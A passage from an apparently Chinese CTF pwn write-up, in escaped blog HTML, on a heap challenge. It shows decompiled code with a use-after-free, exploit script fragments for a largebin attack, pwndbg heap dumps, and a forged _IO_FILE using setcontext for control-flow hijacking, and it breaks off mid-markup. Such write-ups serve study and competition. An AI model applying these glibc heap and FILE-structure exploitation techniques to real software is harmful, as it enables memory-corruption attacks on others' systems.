class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v0; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your cat idx:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = getint();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v0 &amp;lt;= &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v0] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v0]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;明显的一个 uaf，可以用来泄露数据。&lt;/p&gt;
&lt;p&gt;所以我们在看下 show&lt;/p&gt;
&lt;h4 id=&#34;show&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#show&#34;&gt;#&lt;/a&gt; show&lt;/h4&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v0; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;plz input your cat idx:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = getint();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v0 &amp;lt;= &lt;span class=&#34;number&#34;&gt;0xF&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v0] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;Context:\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v0], &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    writen(&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 write，允许输出空字符，最多输出 0x30 字节，这已经够了，我们只要释放两个不相连的 chunk 就可以实现两地址的泄露，但是，这里要注意到，这个 uaf 的负面影响就是，我们不可以再向对应的 idx 申请 chunk，所以我们要控制数量。&lt;/p&gt;
&lt;h4 id=&#34;攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#攻击&#34;&gt;#&lt;/a&gt; 攻击&lt;/h4&gt;
&lt;p&gt;简单的布局下 chunk，泄露出两个地址， 然后准备进行 largebinattack&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x450&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x430&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x440&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)     &lt;span class=&#34;comment&#34;&gt;#4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x460&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;chunk 的情况&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; heap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: &lt;span class=&#34;number&#34;&gt;0x5609eb575000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: &lt;span class=&#34;number&#34;&gt;0x291&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free &lt;span class=&#34;title function_&#34;&gt;chunk&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(largebins)&lt;/span&gt; | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb575290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x451&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x7f2adf8f70e0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bk: 0x5609eb575b00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd_nextsize: 0x5609eb575b00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bk_nextsize: 0x5609eb575b00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb5756e0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x420&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Free &lt;span class=&#34;title function_&#34;&gt;chunk&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(largebins)&lt;/span&gt; | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb575b00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x461&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd: 0x5609eb575290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bk: 0x7f2adf8f70e0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fd_nextsize: 0x5609eb575290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bk_nextsize: 0x5609eb575290&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb575f60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x420&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb576380&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x441&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Allocated chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb5767c0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x471&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Top chunk | PREV_INUSE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Addr: 0x5609eb576c30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Size: 0x1f3d1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来就是获取到_IO_list_all 的位置，然后进行伪造 iofile&lt;/p&gt;
&lt;p&gt;伪造的模板，作者已经提供了，这里是用到了 setcontext 进行参数的设置，我们需要手动更改下 fake_io_addr 的地址为我们控制的 chunk 地址，这里就是 largebin attack 生效的攻击地址。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;fake_io_addr=heapbase+&lt;span class=&#34;number&#34;&gt;0xb00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;next_chain = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE=p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(fake_io_addr+&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#_IO_backup_base=setcontext_rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(setcontext+&lt;span class=&#34;number&#34;&gt;61&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#_IO_save_end=call addr(call setcontext)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0x58&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# _chain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(heapbase+&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# _lock = a writable address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(fake_io_addr+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#_wide_data,rax1_addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0xB0&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# _mode = 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE = fake_IO_FILE.ljust(&lt;span class=&#34;number&#34;&gt;0xC8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(libcbase+&lt;span class=&#34;number&#34;&gt;0x2160c0&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# vtable=IO_wfile_jumps+0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE +=p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_IO_FILE += p64(fake_io_addr+&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# rax2_addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;伪造好后的_io_file&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span 